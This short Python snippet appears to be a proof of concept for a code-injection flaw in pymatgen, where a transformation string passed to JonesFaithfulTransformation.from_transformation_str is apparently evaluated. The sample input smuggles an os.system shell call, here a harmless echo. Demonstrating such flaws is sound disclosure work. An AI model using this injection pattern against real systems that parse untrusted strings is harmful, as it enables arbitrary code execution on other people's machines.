from pymatgen.transformations.standard_transformations import JonesFaithfulTransformation

# Example of insecure usage that could lead to code execution
transformation_str = "__import__('os').system('echo Vulnerable!')"
transformation = JonesFaithfulTransformation.from_transformation_str(transformation_str)